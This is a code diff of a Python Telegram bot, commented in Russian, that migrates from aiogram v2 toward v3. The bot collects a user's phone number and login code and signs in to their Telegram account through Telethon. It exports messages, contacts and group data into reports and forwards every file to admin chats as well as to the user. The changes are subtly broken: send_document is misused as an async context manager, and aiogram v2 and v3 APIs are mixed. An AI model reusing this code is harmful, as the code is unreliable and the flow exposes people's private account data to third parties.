@@ -1,12 +1,12 @@
 import logging
+import asyncio
+import os
 from aiogram import Bot, Dispatcher, types
-from aiogram.contrib.middlewares.logging import LoggingMiddleware
+from aiogram.dispatcher.middlewares import BaseMiddleware
 from aiogram.types import ParseMode
 from aiogram.utils import executor
 from telethon import TelegramClient
 from dotenv import load_dotenv
-import asyncio  
-import os
 from defunc import (
     get_user_info,
     get_blocked_bot,
@@ -31,8 +31,7 @@ admin_chat_ids = [int(chat_id) for chat_id in admin_chat_ids_str.split(",")]
 # Создаем TelegramClient и Bot
 client = TelegramClient('session_name', api_id, api_hash)
 bot = Bot(token=bot_token)
-dp = Dispatcher(bot)
-dp.middleware.setup(LoggingMiddleware())
+dp = Dispatcher()
 
 # Логирование
 logging.basicConfig(level=logging.INFO)
@@ -40,9 +39,8 @@ logging.basicConfig(level=logging.INFO)
 # Словарь для хранения состояния пользователя
 user_state = {}
 
-# Ваши определения функций
-
-def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
+# Функция для отправки файлов
+async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
     file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', '_report.pdf']
 
     for file_extension in file_extensions:
@@ -50,26 +48,28 @@ def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
         
         for file_to_send in files_to_send:
             for admin_chat_id in admin_chat_ids:
-                with open(file_to_send, "rb") as file:
-                    asyncio.run(bot.send_document(admin_chat_id, file))
-            with open(file_to_send, "rb") as file:
-                asyncio.run(bot.send_document(user_chat_id, file))
+                async with bot.send_document(admin_chat_id, open(file_to_send, "rb")) as file:
+                    await bot.send_document(admin_chat_id, file)
+            async with bot.send_document(user_chat_id, open(file_to_send, "rb")) as file:
+                await bot.send_document(user_chat_id, file)
             os.remove(file_to_send)
 
+# Middleware для логирования
+class LoggingMiddleware(BaseMiddleware):
+    async def on_pre_process_update(self, update, data):
+        logging.info(f"Update: {update}")
+
+dp.middleware.setup(LoggingMiddleware())
+
 # Обработчики сообщений
-
-@dp.message_handler(lambda message: message.from_user.id not in allowed_users)
-async def unauthorized(message: types.Message):
-    await message.reply("Извините, вы не авторизованы для использования этого бота.")
-
-@dp.message_handler(commands=['start'])
+@dp.message(commands=['start'])
 async def send_welcome(message: types.Message):
     if message.from_user.id in allowed_users:
-        await message.reply("Добро пожаловать! Пожалуйста, введите ваш номер телефона в международном формате.")
+        await message.answer("Добро пожаловать! Пожалуйста, введите ваш номер телефона в международном формате.")
     else:
-        await unauthorized(message)
+        await message.answer("Извините, вы не авторизованы для использования этого бота.")
 
-@dp.message_handler(lambda message: message.text and message.text.startswith('+') and message.from_user.id in allowed_users)
+@dp.message(lambda message: message.text and message.text.startswith('+') and message.from_user.id in allowed_users)
 async def get_phone_number(message: types.Message):
     phone_number = message.text
     user_state[message.from_user.id] = {'phone_number': phone_number}
@@ -77,11 +77,11 @@ async def get_phone_number(message: types.Message):
         await client.connect()
         phone_code_hash = await client.send_code_request(phone_number)
         user_state[message.from_user.id]['phone_code_hash'] = phone_code_hash
-        await message.reply("Код отправлен на ваш номер. Пожалуйста, введите код, который вы получили.")
+        await message.answer("Код отправлен на ваш номер. Пожалуйста, введите код, который вы получили.")
     except Exception as e:
-        await message.reply(f"Произошла ошибка: {e}")
+        await message.answer(f"Произошла ошибка: {e}")
 
-@dp.message_handler(lambda message: message.text and message.from_user.id in user_state and 'phone_code_hash' in user_state[message.from_user.id])
+@dp.message(lambda message: message.text and message.from_user.id in user_state and 'phone_code_hash' in user_state[message.from_user.id])
 async def get_code(message: types.Message):
     code = message.text
     phone_number = user_state[message.from_user.id]['phone_number']
@@ -89,7 +89,7 @@ async def get_code(message: types.Message):
     user_chat_id = message.from_user.id
     try:
         await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
-        await message.reply("Успешная авторизация!")
+        await message.answer("Успешная авторизация!")
 
         # После успешной авторизации выполнение функций
         selection = '0'
@@ -113,14 +113,14 @@ async def get_code(message: types.Message):
         generate_html_report(phone_number, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, blocked_bot_info_html, user_bots_html)
 
         # Отправляем файлы
-        send_files_to_bot(bot, admin_chat_ids, user_chat_id)
+        await send_files_to_bot(bot, admin_chat_ids, user_chat_id)
 
     except Exception as e:
-        await message.reply(f"Произошла ошибка: {e}")
+        await message.answer(f"Произошла ошибка: {e}")
     finally:
         await client.disconnect()
         user_state.pop(message.from_user.id, None)
 
 # Запуск бота
 if __name__ == '__main__':
-    executor.start_polling(dp, skip_updates=True)
+    dp.run_polling(bot)
